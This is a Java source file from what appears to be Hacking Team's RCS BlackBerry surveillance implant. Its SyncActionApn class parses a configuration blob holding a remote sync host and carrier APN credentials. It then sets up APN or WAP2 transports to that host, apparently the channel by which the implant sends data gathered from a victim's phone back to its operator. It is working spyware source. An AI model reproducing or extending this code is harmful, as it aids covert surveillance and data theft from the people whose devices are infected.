//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action.sync;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import blackberry.action.Apn;
import blackberry.action.sync.transport.ApnTransport;
import blackberry.action.sync.transport.Wap2Transport;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.WChar;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE);
    //#endif

    String host;

    public SyncActionApn(final int actionId_, final byte[] confParams) {
        super(actionId_, confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
        //#endif
    }

    protected boolean parse(final byte[] confParams) {

        Vector apns = new Vector();

        //#ifdef DBC
        Check.requires(apns != null, "parse: apns null");
        //#endif

        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            final int hostLen = databuffer.readInt();
            final byte[] hostRaw = new byte[hostLen];

            databuffer.readFully(hostRaw);
            host = WChar.getString(hostRaw, true);

            //#ifdef DEBUG
            debug.trace("host: " + host);
            //#endif

            final int entries = databuffer.readInt(); // readByte();

            int len;
            byte[] stringRaw;

            for (int i = 0; i < entries; i++) {
                final Apn apn = new Apn();
                apn.mcc = databuffer.readInt(); // readShort();
                apn.mnc = databuffer.readInt(); // readShort();

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.apn = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.user = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); //readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.pass = WChar.getString(stringRaw, true);

                if (apn.isValid()) {
                    //#ifdef DEBUG
                    debug.trace("adding apn: " + apn);
                    //#endif
                    apns.addElement(apn);
                }
            }

            if (apns.size() == 0) {
                //#ifdef DEBUG
                debug.trace("No valid apn, adding Wap2Transport");
                //#endif
                transports.addElement(new Wap2Transport(host));
            } else {
                for (int i = 0; i < apns.size(); i++) {
                    Apn apn = (Apn) apns.elementAt(i);
                    //#ifdef DEBUG
                    debug.trace("parse, adding ApnTransport: " + apn);
                    //#endif

                    //#ifdef DBC
                    Check.asserts(apn.apn.length() > 0, "Invalid apn");
                    //#endif

                    transports.addElement(new ApnTransport(host, apn));
                }
            }

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }
        return true;
    }

    protected boolean initTransport() {
        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncApn ";
    }
    //#endif

}
